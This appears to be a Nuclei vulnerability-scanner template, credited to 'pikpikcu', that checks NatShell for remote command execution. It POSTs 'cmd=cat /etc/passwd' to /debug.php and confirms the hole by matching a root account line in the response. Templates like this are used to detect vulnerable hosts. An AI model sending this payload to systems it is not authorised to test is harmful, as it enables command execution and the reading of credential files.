id: natshell-rcce

info:
  name: NatShell Rce
  author: pikpikcu
  severity: critical
  reference: |
    - https://twitter.com/sec715/status/1397924997457317897
  tags: natshell,rce

requests:
  - method: POST
    path:
      - "{{BaseURL}}/debug.php"
    body: |
      cmd=cat /etc/passwd

    matchers-condition: and
    matchers:

      - type: regex
        regex:
          - "toor:[x*]:0:0"

      - type: status
        status:
          - 200
